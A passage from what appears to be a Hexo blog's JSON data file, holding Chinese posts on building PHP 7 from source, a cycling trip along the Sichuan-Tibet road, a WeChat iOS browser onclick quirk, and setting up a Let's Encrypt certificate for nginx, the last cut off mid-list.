class=\"line\">+--------------------------------------------------------------------+</span><br><span class=\"line\">Thank you for using PHP.</span><br><span class=\"line\">config.status: creating php7.spec</span><br><span class=\"line\">config.status: creating main/build-defs.h</span><br><span class=\"line\">config.status: creating scripts/phpize</span><br><span class=\"line\">config.status: creating scripts/man1/phpize.1</span><br><span class=\"line\">config.status: creating scripts/php-config</span><br><span class=\"line\">config.status: creating scripts/man1/php-config.1</span><br><span class=\"line\">config.status: creating sapi/cli/php.1</span><br><span class=\"line\">config.status: creating sapi/cgi/php-cgi.1</span><br><span class=\"line\">config.status: creating ext/phar/phar.1</span><br><span class=\"line\">config.status: creating ext/phar/phar.phar.1</span><br><span class=\"line\">config.status: creating main/php_config.h</span><br><span class=\"line\">config.status: executing default commands</span><br><span class=\"line\">configure: WARNING: unrecognized options: --with-mysql</span><br></pre></td></tr></table></figure></p>\n<p>接下来就是漫长的make<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ make</span><br><span class=\"line\"># make install</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"大功告成\"><a href=\"#大功告成\" class=\"headerlink\" title=\"大功告成!\"></a>大功告成!</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ /srv/server/php7/bin/php -v</span><br><span class=\"line\">PHP 7.0.0-dev (cli) (built: May 14 2015 18:30:21) </span><br><span class=\"line\">Copyright (c) 1997-2015 The PHP Group</span><br><span class=\"line\">Zend Engine v3.0.0-dev, Copyright (c) 1998-2015 Zend Technologies</span><br></pre></td></tr></table></figure>\n<h2 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h2><h3 id=\"路径说明\"><a href=\"#路径说明\" class=\"headerlink\" title=\"路径说明\"></a>路径说明</h3><p>php源码包放置在 <code>/srv/package/php-7</code><br>php安装在 <code>/srv/server/php7</code></p>\n<h3 id=\"设置配置文件\"><a href=\"#设置配置文件\" class=\"headerlink\" title=\"设置配置文件\"></a>设置配置文件</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /srv/package/php-7/php.ini-development /srv/server/php7/lib/php.ini</span><br></pre></td></tr></table></figure>\n<h3 id=\"作为CGI模式运行在后台\"><a href=\"#作为CGI模式运行在后台\" class=\"headerlink\" title=\"作为CGI模式运行在后台\"></a>作为CGI模式运行在后台</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nohup /srv/server/php7/bin/php-cgi -b 127.0.0.1:9002 -c /srv/server/php7/lib/php.ini &gt; /var/log/php-cgi.log &amp;amp;</span><br></pre></td></tr></table></figure>\n<p>wordpress 已经支持运行在php7上了</p>\n<h3 id=\"优化点\"><a href=\"#优化点\" class=\"headerlink\" title=\"优化点\"></a>优化点</h3><p>在编译时可以启用fpm –enable-fpm 这样管理php-cgi进程就方便多了</p>\n","site":{"data":{}},"excerpt":"","more":"<p>php7目前还处于开发阶段，有很多扩展模块不支持．当然有一些新特性还是很值得玩玩的．</p>\n<p>文档可以在 <a href=\"https://wiki.php.net/phpng\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/phpng</a> 看到</p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>普通用户需要从https协议下载，ssh协议只面向PHP小组开发者<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://git.php.net/repository/php-src.git</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./buildconf</span><br><span class=\"line\">./configure --prefix=/srv/server/php7 --enable-mbstring --enable-zip --enable-bcmath --enable-pcntl --enable-ftp --enable-exif --enable-calendar --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-wddx --with-curl --with-mcrypt --with-iconv --with-gmp --with-pspell --with-gd --with-jpeg-dir=/usr --with-png-dir=/usr --with-zlib-dir=/usr --with-xpm-dir=/usr --with-freetype-dir=/usr --with-t1lib=/usr --enable-gd-native-ttf --enable-gd-jis-conv --with-openssl --with-mysql=/usr --with-pdo-mysql=/usr --with-gettext=/usr --with-zlib=/usr --with-bz2=/usr --with-recode=/usr --with-mysqli=/usr/bin/mysql_config</span><br></pre></td></tr></table></figure>\n<h4 id=\"在安装时可能遇到的依赖问题\"><a href=\"#在安装时可能遇到的依赖问题\" class=\"headerlink\" title=\"在安装时可能遇到的依赖问题\"></a>在安装时可能遇到的依赖问题</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checking for re2c... no</span><br><span class=\"line\">configure: WARNING: You will need re2c 0.13.4 or later if you want to regenerate PHP parsers.</span><br></pre></td></tr></table></figure>\n<h5 id=\"需要安装re2c库\"><a href=\"#需要安装re2c库\" class=\"headerlink\" title=\"需要安装re2c库\"></a>需要安装<a href=\"http://re2c.org/\" target=\"_blank\" rel=\"noopener\">re2c库</a></h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://downloads.sourceforge.net/project/re2c/re2c/0.14.2/re2c-0.14.2.tar.gz?r=&amp;amp;ts=1431640121&amp;amp;use_mirror=tcpdiag</span><br></pre></td></tr></table></figure>\n<p>接下来configure 和 make 不多写了</p>\n<h6 id=\"其它问题-bison-bzip2-t1lib-pspell-RECODE\"><a href=\"#其它问题-bison-bzip2-t1lib-pspell-RECODE\" class=\"headerlink\" title=\"其它问题 bison, bzip2, t1lib, pspell, RECODE\"></a>其它问题 bison, bzip2, t1lib, pspell, RECODE</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure: error: bison is required to build PHP/Zend when building a GIT checkout!</span><br><span class=\"line\"># yum install bison bison-devel</span><br><span class=\"line\"></span><br><span class=\"line\">configure: error: Please reinstall the BZip2 distribution</span><br><span class=\"line\"># yum install bzip2 bzip2-devel</span><br><span class=\"line\"></span><br><span class=\"line\">configure: error: Your t1lib distribution is not installed correctly. Please reinstall it.</span><br><span class=\"line\"># yum install t1lib t1lib-devel</span><br><span class=\"line\"></span><br><span class=\"line\">configure: error: Unable to locate gmp.h</span><br><span class=\"line\"># yum install gmp-devel</span><br><span class=\"line\"></span><br><span class=\"line\">configure: error: Cannot find pspell</span><br><span class=\"line\"># yum install aspell aspell-devel</span><br><span class=\"line\"></span><br><span class=\"line\">configure: error: Can not find recode.h anywhere under /usr /usr/local /usr /opt.</span><br><span class=\"line\"># yum install recode recode-devel</span><br></pre></td></tr></table></figure>\n<p>不同的环境可能还有其它依赖问题，不过都可以google解决的</p>\n<p>好了，configure 完成<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Generating files</span><br><span class=\"line\">configure: creating ./config.status</span><br><span class=\"line\">creating main/internal_functions.c</span><br><span class=\"line\">creating main/internal_functions_cli.c</span><br><span class=\"line\">+--------------------------------------------------------------------+</span><br><span class=\"line\">| License:                                                           |</span><br><span class=\"line\">| This software is subject to the PHP License, available in this     |</span><br><span class=\"line\">| distribution in the file LICENSE.  By continuing this installation |</span><br><span class=\"line\">| process, you are bound by the terms of this license agreement.     |</span><br><span class=\"line\">| If you do not agree with the terms of this license, you must abort |</span><br><span class=\"line\">| the installation process at this point.                            |</span><br><span class=\"line\">+--------------------------------------------------------------------+</span><br><span class=\"line\">Thank you for using PHP.</span><br><span class=\"line\">config.status: creating php7.spec</span><br><span class=\"line\">config.status: creating main/build-defs.h</span><br><span class=\"line\">config.status: creating scripts/phpize</span><br><span class=\"line\">config.status: creating scripts/man1/phpize.1</span><br><span class=\"line\">config.status: creating scripts/php-config</span><br><span class=\"line\">config.status: creating scripts/man1/php-config.1</span><br><span class=\"line\">config.status: creating sapi/cli/php.1</span><br><span class=\"line\">config.status: creating sapi/cgi/php-cgi.1</span><br><span class=\"line\">config.status: creating ext/phar/phar.1</span><br><span class=\"line\">config.status: creating ext/phar/phar.phar.1</span><br><span class=\"line\">config.status: creating main/php_config.h</span><br><span class=\"line\">config.status: executing default commands</span><br><span class=\"line\">configure: WARNING: unrecognized options: --with-mysql</span><br></pre></td></tr></table></figure></p>\n<p>接下来就是漫长的make<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ make</span><br><span class=\"line\"># make install</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"大功告成\"><a href=\"#大功告成\" class=\"headerlink\" title=\"大功告成!\"></a>大功告成!</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ /srv/server/php7/bin/php -v</span><br><span class=\"line\">PHP 7.0.0-dev (cli) (built: May 14 2015 18:30:21) </span><br><span class=\"line\">Copyright (c) 1997-2015 The PHP Group</span><br><span class=\"line\">Zend Engine v3.0.0-dev, Copyright (c) 1998-2015 Zend Technologies</span><br></pre></td></tr></table></figure>\n<h2 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h2><h3 id=\"路径说明\"><a href=\"#路径说明\" class=\"headerlink\" title=\"路径说明\"></a>路径说明</h3><p>php源码包放置在 <code>/srv/package/php-7</code><br>php安装在 <code>/srv/server/php7</code></p>\n<h3 id=\"设置配置文件\"><a href=\"#设置配置文件\" class=\"headerlink\" title=\"设置配置文件\"></a>设置配置文件</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /srv/package/php-7/php.ini-development /srv/server/php7/lib/php.ini</span><br></pre></td></tr></table></figure>\n<h3 id=\"作为CGI模式运行在后台\"><a href=\"#作为CGI模式运行在后台\" class=\"headerlink\" title=\"作为CGI模式运行在后台\"></a>作为CGI模式运行在后台</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nohup /srv/server/php7/bin/php-cgi -b 127.0.0.1:9002 -c /srv/server/php7/lib/php.ini &gt; /var/log/php-cgi.log &amp;amp;</span><br></pre></td></tr></table></figure>\n<p>wordpress 已经支持运行在php7上了</p>\n<h3 id=\"优化点\"><a href=\"#优化点\" class=\"headerlink\" title=\"优化点\"></a>优化点</h3><p>在编译时可以启用fpm –enable-fpm 这样管理php-cgi进程就方便多了</p>\n"},{"title":"川藏线骑行游记","id":"307","date":"2016-05-19T21:53:15.000Z","_content":"\n一直有骑行川藏线的想法，计划了很长时间。现在这段旅程已经过去两周了，这才想起要记录下来。\n\n## 出发\n\n5月3号抵达成都，在成都玩了3天。景点就去了武侯祠，感觉很不好。既要收门票，并且没什么特色，跟个公园差不多。\n\n然后5号开始了川藏南线的骑行\n\n## D1:邛崃市\n\n一路都是成都平原，马路两边都是农田，只是第一次见到四川盆地的水稻。\n\n## D2:雅安市\n\n后半段终于有山坡了，随处可见的茶园和酒厂。\n\n雅安也叫雨城，每天都会下阵雨。\n\n## D3:天全县紫石乡\n\n天全线正在修雅安-康定的高速，影响到国道的通行了。道路单向行驶，所以我只好推着车子走了大部分路。5点的时候在路边的农家乐住下了，60块钱的房费，感觉还行。就是半夜的时候，山上到处都是青蛙叫，害得我一夜没睡好。\n\n## D4:泸定县\n\n去往泸定县要翻越二郎山，连续二十几公里都是蜿蜒盘旋的上山路，从出发就一直在推车。山坡上遇到了四川的骑友小胡，我俩结伴骑到了泸定。\n\n快到山顶时，终于要穿越二郎山隧道。感觉隧道很恐怖，也许是我的车子尾灯不够亮，总担心后面有车撞到我。\n\n过了隧道就又是连续的下坡路了。用了半天时间上山，结果半个小时就下去了。\n\n到泸定县城的时候，看到路边的骑行者之家。看到老板娘很漂亮就没多想，结果住宿的体验很差，什么都没有。不过也很便宜，双人间60块钱而已。\n\n## D5:康定县\n\n去康定的路上，是连续二十几公里的上坡路，加上太阳的暴晒，让我非常苦恼。\n\n最后我选择了放弃继续前行，在康定把车子快递回去，连夜返回了成都。\n\nEND\n\n现在想想挺遗憾当时的决定，明年有时间要把没骑完的旅程补上。","source":"_posts/e5-b7-9d-e8-97-8f-e7-ba-bf-e9-aa-91-e8-a1-8c-e6-b8-b8-e8-ae-b0.md","raw":"---\ntitle: 川藏线骑行游记\nid: 307\ncategories:\n  - 骑行\ndate: 2016-05-20 05:53:15\ntags:\n---\n\n一直有骑行川藏线的想法，计划了很长时间。现在这段旅程已经过去两周了，这才想起要记录下来。\n\n## 出发\n\n5月3号抵达成都，在成都玩了3天。景点就去了武侯祠，感觉很不好。既要收门票，并且没什么特色，跟个公园差不多。\n\n然后5号开始了川藏南线的骑行\n\n## D1:邛崃市\n\n一路都是成都平原，马路两边都是农田，只是第一次见到四川盆地的水稻。\n\n## D2:雅安市\n\n后半段终于有山坡了，随处可见的茶园和酒厂。\n\n雅安也叫雨城，每天都会下阵雨。\n\n## D3:天全县紫石乡\n\n天全线正在修雅安-康定的高速，影响到国道的通行了。道路单向行驶，所以我只好推着车子走了大部分路。5点的时候在路边的农家乐住下了，60块钱的房费，感觉还行。就是半夜的时候，山上到处都是青蛙叫，害得我一夜没睡好。\n\n## D4:泸定县\n\n去往泸定县要翻越二郎山，连续二十几公里都是蜿蜒盘旋的上山路，从出发就一直在推车。山坡上遇到了四川的骑友小胡，我俩结伴骑到了泸定。\n\n快到山顶时，终于要穿越二郎山隧道。感觉隧道很恐怖，也许是我的车子尾灯不够亮，总担心后面有车撞到我。\n\n过了隧道就又是连续的下坡路了。用了半天时间上山，结果半个小时就下去了。\n\n到泸定县城的时候，看到路边的骑行者之家。看到老板娘很漂亮就没多想，结果住宿的体验很差，什么都没有。不过也很便宜，双人间60块钱而已。\n\n## D5:康定县\n\n去康定的路上，是连续二十几公里的上坡路，加上太阳的暴晒，让我非常苦恼。\n\n最后我选择了放弃继续前行，在康定把车子快递回去，连夜返回了成都。\n\nEND\n\n现在想想挺遗憾当时的决定，明年有时间要把没骑完的旅程补上。","slug":"e5-b7-9d-e8-97-8f-e7-ba-bf-e9-aa-91-e8-a1-8c-e6-b8-b8-e8-ae-b0","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhv7000wlzlm0mizqzbu","content":"<p>一直有骑行川藏线的想法，计划了很长时间。现在这段旅程已经过去两周了，这才想起要记录下来。</p>\n<h2 id=\"出发\"><a href=\"#出发\" class=\"headerlink\" title=\"出发\"></a>出发</h2><p>5月3号抵达成都，在成都玩了3天。景点就去了武侯祠，感觉很不好。既要收门票，并且没什么特色，跟个公园差不多。</p>\n<p>然后5号开始了川藏南线的骑行</p>\n<h2 id=\"D1-邛崃市\"><a href=\"#D1-邛崃市\" class=\"headerlink\" title=\"D1:邛崃市\"></a>D1:邛崃市</h2><p>一路都是成都平原，马路两边都是农田，只是第一次见到四川盆地的水稻。</p>\n<h2 id=\"D2-雅安市\"><a href=\"#D2-雅安市\" class=\"headerlink\" title=\"D2:雅安市\"></a>D2:雅安市</h2><p>后半段终于有山坡了，随处可见的茶园和酒厂。</p>\n<p>雅安也叫雨城，每天都会下阵雨。</p>\n<h2 id=\"D3-天全县紫石乡\"><a href=\"#D3-天全县紫石乡\" class=\"headerlink\" title=\"D3:天全县紫石乡\"></a>D3:天全县紫石乡</h2><p>天全线正在修雅安-康定的高速，影响到国道的通行了。道路单向行驶，所以我只好推着车子走了大部分路。5点的时候在路边的农家乐住下了，60块钱的房费，感觉还行。就是半夜的时候，山上到处都是青蛙叫，害得我一夜没睡好。</p>\n<h2 id=\"D4-泸定县\"><a href=\"#D4-泸定县\" class=\"headerlink\" title=\"D4:泸定县\"></a>D4:泸定县</h2><p>去往泸定县要翻越二郎山，连续二十几公里都是蜿蜒盘旋的上山路，从出发就一直在推车。山坡上遇到了四川的骑友小胡，我俩结伴骑到了泸定。</p>\n<p>快到山顶时，终于要穿越二郎山隧道。感觉隧道很恐怖，也许是我的车子尾灯不够亮，总担心后面有车撞到我。</p>\n<p>过了隧道就又是连续的下坡路了。用了半天时间上山，结果半个小时就下去了。</p>\n<p>到泸定县城的时候，看到路边的骑行者之家。看到老板娘很漂亮就没多想，结果住宿的体验很差，什么都没有。不过也很便宜，双人间60块钱而已。</p>\n<h2 id=\"D5-康定县\"><a href=\"#D5-康定县\" class=\"headerlink\" title=\"D5:康定县\"></a>D5:康定县</h2><p>去康定的路上，是连续二十几公里的上坡路，加上太阳的暴晒，让我非常苦恼。</p>\n<p>最后我选择了放弃继续前行，在康定把车子快递回去，连夜返回了成都。</p>\n<p>END</p>\n<p>现在想想挺遗憾当时的决定，明年有时间要把没骑完的旅程补上。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>一直有骑行川藏线的想法，计划了很长时间。现在这段旅程已经过去两周了，这才想起要记录下来。</p>\n<h2 id=\"出发\"><a href=\"#出发\" class=\"headerlink\" title=\"出发\"></a>出发</h2><p>5月3号抵达成都，在成都玩了3天。景点就去了武侯祠，感觉很不好。既要收门票，并且没什么特色，跟个公园差不多。</p>\n<p>然后5号开始了川藏南线的骑行</p>\n<h2 id=\"D1-邛崃市\"><a href=\"#D1-邛崃市\" class=\"headerlink\" title=\"D1:邛崃市\"></a>D1:邛崃市</h2><p>一路都是成都平原，马路两边都是农田，只是第一次见到四川盆地的水稻。</p>\n<h2 id=\"D2-雅安市\"><a href=\"#D2-雅安市\" class=\"headerlink\" title=\"D2:雅安市\"></a>D2:雅安市</h2><p>后半段终于有山坡了，随处可见的茶园和酒厂。</p>\n<p>雅安也叫雨城，每天都会下阵雨。</p>\n<h2 id=\"D3-天全县紫石乡\"><a href=\"#D3-天全县紫石乡\" class=\"headerlink\" title=\"D3:天全县紫石乡\"></a>D3:天全县紫石乡</h2><p>天全线正在修雅安-康定的高速，影响到国道的通行了。道路单向行驶，所以我只好推着车子走了大部分路。5点的时候在路边的农家乐住下了，60块钱的房费，感觉还行。就是半夜的时候，山上到处都是青蛙叫，害得我一夜没睡好。</p>\n<h2 id=\"D4-泸定县\"><a href=\"#D4-泸定县\" class=\"headerlink\" title=\"D4:泸定县\"></a>D4:泸定县</h2><p>去往泸定县要翻越二郎山，连续二十几公里都是蜿蜒盘旋的上山路，从出发就一直在推车。山坡上遇到了四川的骑友小胡，我俩结伴骑到了泸定。</p>\n<p>快到山顶时，终于要穿越二郎山隧道。感觉隧道很恐怖，也许是我的车子尾灯不够亮，总担心后面有车撞到我。</p>\n<p>过了隧道就又是连续的下坡路了。用了半天时间上山，结果半个小时就下去了。</p>\n<p>到泸定县城的时候，看到路边的骑行者之家。看到老板娘很漂亮就没多想，结果住宿的体验很差，什么都没有。不过也很便宜，双人间60块钱而已。</p>\n<h2 id=\"D5-康定县\"><a href=\"#D5-康定县\" class=\"headerlink\" title=\"D5:康定县\"></a>D5:康定县</h2><p>去康定的路上，是连续二十几公里的上坡路，加上太阳的暴晒，让我非常苦恼。</p>\n<p>最后我选择了放弃继续前行，在康定把车子快递回去，连夜返回了成都。</p>\n<p>END</p>\n<p>现在想想挺遗憾当时的决定，明年有时间要把没骑完的旅程补上。</p>\n"},{"title":"微信自带的浏览器真蛋疼","id":"204","date":"2015-11-23T13:59:03.000Z","_content":"\n一些正常的页面，在微信自带的浏览器里打开，就会有奇怪的Javascript问题。\n\n比如最近两天遇到的：input标签的onclick事件无效。\n\n```\n<input type=\"text\" id=\"test_input\" />\n<script type=\"text/javascript\">\n(function(input){\n  input.onclick = function(){\n    alert(\"it work\"); // but not work in ios weixin\n  }\n})(document.getElementById('test_input'));\n</script>\n```\n\n在iOS版微信下，点击input不会触发onclick事件，而安卓版微信却能正常触发。这不是iOS的问题，因为同一设备的下safari浏览器能正常触发。\n\n微信自带的浏览器用的是自家实现的QQ浏览器内核，这个事件不触发，我有两种猜测：\n\n1.  QQ浏览器内核的bug\n2.  为了节省内核安装包的大小，砍掉了不常用的事件和功能\n\n之前也遇到过，h5 radio标签的onstop,onstart等事件无效。\n\n不过我不懂客户端，不清楚浏览器内核是怎么实现的，所以暂时记录下，留待以后研究。\n\n&nbsp;","source":"_posts/e5-be-ae-e4-bf-a1-e8-87-aa-e5-b8-a6-e7-9a-84-e6-b5-8f-e8-a7-88-e5-99-a8-e7-9c-9f-e8-9b-8b-e7-96-bc.md","raw":"---\ntitle: 微信自带的浏览器真蛋疼\nid: 204\ncategories:\n  - 前端\ndate: 2015-11-23 21:59:03\ntags:\n---\n\n一些正常的页面，在微信自带的浏览器里打开，就会有奇怪的Javascript问题。\n\n比如最近两天遇到的：input标签的onclick事件无效。\n\n```\n<input type=\"text\" id=\"test_input\" />\n<script type=\"text/javascript\">\n(function(input){\n  input.onclick = function(){\n    alert(\"it work\"); // but not work in ios weixin\n  }\n})(document.getElementById('test_input'));\n</script>\n```\n\n在iOS版微信下，点击input不会触发onclick事件，而安卓版微信却能正常触发。这不是iOS的问题，因为同一设备的下safari浏览器能正常触发。\n\n微信自带的浏览器用的是自家实现的QQ浏览器内核，这个事件不触发，我有两种猜测：\n\n1.  QQ浏览器内核的bug\n2.  为了节省内核安装包的大小，砍掉了不常用的事件和功能\n\n之前也遇到过，h5 radio标签的onstop,onstart等事件无效。\n\n不过我不懂客户端，不清楚浏览器内核是怎么实现的，所以暂时记录下，留待以后研究。\n\n&nbsp;","slug":"e5-be-ae-e4-bf-a1-e8-87-aa-e5-b8-a6-e7-9a-84-e6-b5-8f-e8-a7-88-e5-99-a8-e7-9c-9f-e8-9b-8b-e7-96-bc","published":1,"updated":"2018-03-05T12:57:51.549Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhv8000xlzlmskw0a3g5","content":"<p>一些正常的页面，在微信自带的浏览器里打开，就会有奇怪的Javascript问题。</p>\n<p>比如最近两天遇到的：input标签的onclick事件无效。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input type=&quot;text&quot; id=&quot;test_input&quot; /&gt;</span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">(function(input)&#123;</span><br><span class=\"line\">  input.onclick = function()&#123;</span><br><span class=\"line\">    alert(&quot;it work&quot;); // but not work in ios weixin</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)(document.getElementById(&apos;test_input&apos;));</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>在iOS版微信下，点击input不会触发onclick事件，而安卓版微信却能正常触发。这不是iOS的问题，因为同一设备的下safari浏览器能正常触发。</p>\n<p>微信自带的浏览器用的是自家实现的QQ浏览器内核，这个事件不触发，我有两种猜测：</p>\n<ol>\n<li>QQ浏览器内核的bug</li>\n<li>为了节省内核安装包的大小，砍掉了不常用的事件和功能</li>\n</ol>\n<p>之前也遇到过，h5 radio标签的onstop,onstart等事件无效。</p>\n<p>不过我不懂客户端，不清楚浏览器内核是怎么实现的，所以暂时记录下，留待以后研究。</p>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>一些正常的页面，在微信自带的浏览器里打开，就会有奇怪的Javascript问题。</p>\n<p>比如最近两天遇到的：input标签的onclick事件无效。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input type=&quot;text&quot; id=&quot;test_input&quot; /&gt;</span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">(function(input)&#123;</span><br><span class=\"line\">  input.onclick = function()&#123;</span><br><span class=\"line\">    alert(&quot;it work&quot;); // but not work in ios weixin</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)(document.getElementById(&apos;test_input&apos;));</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>在iOS版微信下，点击input不会触发onclick事件，而安卓版微信却能正常触发。这不是iOS的问题，因为同一设备的下safari浏览器能正常触发。</p>\n<p>微信自带的浏览器用的是自家实现的QQ浏览器内核，这个事件不触发，我有两种猜测：</p>\n<ol>\n<li>QQ浏览器内核的bug</li>\n<li>为了节省内核安装包的大小，砍掉了不常用的事件和功能</li>\n</ol>\n<p>之前也遇到过，h5 radio标签的onstop,onstart等事件无效。</p>\n<p>不过我不懂客户端，不清楚浏览器内核是怎么实现的，所以暂时记录下，留待以后研究。</p>\n<p>&nbsp;</p>\n"},{"title":"折腾Let‘s Encrypt免费SSL证书","id":"223","date":"2015-12-04T15:28:27.000Z","_content":"\n今天开始折腾Let’s Encrypt的免费SSL证书。\n\n> [https://letsencrypt.org/howitworks/](https://letsencrypt.org/howitworks/)\n\n## 介绍\n\n通过一行命令，它会自动完成SSL的域名认证，证书生成等工作，最重要的是免费。虽然WoSign,StartSSL也免费，不过申请有点不方便。\n\n首先，在网站DNS指向的机器上，执行创建证书的命令。比如`xiaoai.me`指向`104.155.200.103`，那么只有在`104.155.200.103`上才能调用命令创建。\n\n```\n$ git clone https://github.com/letsencrypt/letsencrypt\n$ ./letsencrypt/letsencrypt-auto certonly -d xiaoai.me\n```\n\n任何厂商都需要确保证书不会被冒领，因此Let‘s Encrypt会首先验证你是网站域名拥有者。在执行以上命令时，他们的远程服务器会请求申请的网站，通过预先放置的特殊文件等手段来确认身份。\n\n但是这一步遇到了DNSpod在海外（Let‘s Encrypt的服务器）解析超时的问题。要解决这个问题，只能放弃DNSpod，没有其它办法。\n\n```\nFailed authorization procedure. xiaoai.me (tls-sni-01): urn:acme:error:connection :: The server could not connect to the client for DV :: DNS query timed out\n```\n\n> 许多人反映DNSpod有问题：https://github.com/letsencrypt/letsencrypt/issues/1610\n\n我把域名服务器换到google cloud DNS，解决了DNS的问题。\n\n再次运行，填写联系邮箱，同意协议，接下来就成功了。注意在运行命令前需要先关闭占用`80`端口的服务器。\n\n```\n> IMPORTANT NOTES:\n>        - Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/xiaoai.me/fullchain.pem. Your cert will expire on 2016-03-03\\. To obtain a new version of the certificate in the future, simply run Let's Encrypt again.\n>        - If like Let's Encrypt, please consider supporting our work by:\n>          Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate\n>          Donating to EFF:                    https://eff.org/donate-le\n```\n\n脚本已经自动生成了一套SSL证书，其位置如下：\n\n```\n$ sudo ls /etc/letsencrypt/live/xiaoai.me\ncert.pem  chain.pem  fullchain.pem  privkey.pem\n```\n\n## 配置\n\n接下来把证书添加到nginx的配置文件中就OK了：\n\n```\nssl on;\nlisten  443 ssl http2;\nserver_name xiaoai.me\nssl_certificate /etc/letsencrypt/live/xiaoai.me/fullchain.pem;\nssl_certificate_key /etc/letsencrypt/live/xiaoai.me/privkey.pem;\n```\n\n整个过程非常简单，现在网站的证书颁发机构变成了 `Let's Encrypt Authority X1`\n\n## 说明\n\n### 验证方式\n\nlet's encrypt 提供了多种方式，验证你是这个域名的拥有者。\n\n- 上面关闭80端口的服务，由创建脚本暂时监听`xiaoai.me:80`端口，以验证网站属于创建者\n- 通过 `--webroot` 参数指定网站根目录，创建脚本会在目录里放置验证文件，用以让远程服务器来访问\n- 通过 `--apache` 参数，自动干预apache服务器，验证原理和上面类似\n- 